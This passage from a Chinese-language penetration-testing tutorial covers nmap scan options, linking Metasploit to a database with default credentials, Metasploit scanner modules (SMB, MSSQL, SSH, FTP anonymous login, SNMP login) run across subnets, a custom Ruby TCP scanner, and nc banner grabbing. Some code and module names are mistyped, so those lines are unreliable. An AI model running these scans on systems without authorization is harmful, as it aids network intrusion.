class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nslookup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set type=mx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; example.com</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2用nmap探测开放端口和服务">2、用nmap探测开放端口和服务：<a class="hash-link" href="#2用nmap探测开放端口和服务" title="标题的直接链接">​</a></h3><p>-sS SYN半开扫描  -sT TCP 半开扫描 -Pn 不使用ping 方式探测主机  -A 探测服务类型 -6 开启IPV6扫描  -O 探测操作系统版本
常用扫描参数组合：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn 192.168.0.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn –A 192.168.0.111 </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>其他组合：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -A -v 深入式扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sS -sU -T4 -A -v 同上，且扫UDP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -p 1-65535 -T4 -A -v  扫描所有TCP端口</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -A -v -Pn 不使用ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sn 使用ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -F 快速扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -T4 -O -F --version-light 加强版快速扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sn --traceroute 快速路由跟踪扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; 慢速全面扫描</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（nmap的scripts位于/usr/local/share/nmap/scripts/目录，用LUA语言编写，nmap --script-help all | less 查看脚本扫描帮助信息）
（nmap还有一个GUI界面工具叫zenmap，命令zenmap或nmapfe都可以启动）</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3msf与postgresql协同工作">3、MSF与postgresql协同工作<a class="hash-link" href="#3msf与postgresql协同工作" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/etc/init.d/postgreql-8.3 start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 导入nmap扫描的结果：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn –A –oX Subnet1 192.168.1.0/24   # -oX 扫描结果导出为Subnet1.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_import Subnet1.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_hosts –c address   #查看导入的主机IP </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>msf也可以和mysql一起工作，在bt5 r1中msf默认支持连接mysql：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_driver mysql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect root:toor@127.0.0.1/msf3 #连接本机mysql的msf3数据库</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql默认密码toor，使用db_connect连接时会自动创建msf3库）</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="4高级扫描方式">4、高级扫描方式：<a class="hash-link" href="#4高级扫描方式" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ip/ipidseq   #IPID序列扫描器，与nmap的-sI -O选项类似</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（RHOSTS、RPORT等参数也可以用小写）</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –PN –sI 192.168.1.09 192.168.1.155</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>nmap 连接数据库：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_nmap –sS –A 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_services  #查看扫描结果</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用portscan模块：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search postscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use scanner/postscan/syn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="5特定扫描">5、特定扫描：<a class="hash-link" href="#5特定扫描" title="标题的直接链接">​</a></h3><p>smb_version模块：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smb/smb_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,os_flavor</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>查找mssql主机：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>SSH服务器扫描：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ssh/ssh_version </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>FTP主机扫描：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ftp/ftp_version </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>扫描FTP匿名登录：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use auxiliary/scanner/ftp/anonymos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>扫描SNMP主机：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/snmp/snmp_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="6编写自定义扫描模块">6、编写自定义扫描模块：<a class="hash-link" href="#6编写自定义扫描模块" title="标题的直接链接">​</a></h3><p>MSF框架提供对其所有exploit和method的访问，支持代理，SSL，报告生成，线程， 使用Ruby语言。</p><p>例子：一个简单的自定义扫描模块</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#Metasploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">require ‘msf/core’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class Metasploit3 &lt; Msf::Auxiliary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Exploit::Remote::Tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf:Auxiliary::Scanner</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def initialize</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">super(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Name’ =&gt; ‘My custom TCP scan’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Version’ =&gt; ‘$Revision: 1$’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Description’ =&gt; ‘My quick scanner’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Author’ =&gt; ‘Your name here’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘License’ =&gt; ‘MSF_LICENSE’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">register_options(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Opt::RPORT(12345)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ],self.class)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def run_host(ip)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    connect()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sock.puts(‘HELLO SERVER’)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data = sock.recv(1024)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        print_status(“Received: #{data} from #{ip}”)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        disconnect()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>测试：将模块保存到modules/auxiliary/scanner/目录下面,命名为simple_tcp.rb，注意保存的位置很重要。</p><p>使用nc监听一个端口测试这个模块：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo “Hello Metasploit” &gt; banner.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nc –lvnp 12345 &lt; banner.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/simple_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Received: Hello Metasploit from 192.168.1.111</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="四基本漏洞扫描">四．基本漏洞扫描<a class="hash-link" href="#四基本漏洞扫描" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-基本扫描">1 基本扫描<a class="hash-link" href="#1-基本扫描" title="标题的直接链接">​</a></h3><p>1、使用nc与目标端口通信，获取目标端口的信息：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc 192.168.1.111 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GET HTTP 1/1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server: Microsoft-IIS/5.1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>  1: 还有一个功能与nc类似的工具Ncat，产自nmap社区，可实现相同功能：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ncat -C 192.168.1.111 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GET / HTTP/1.0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" 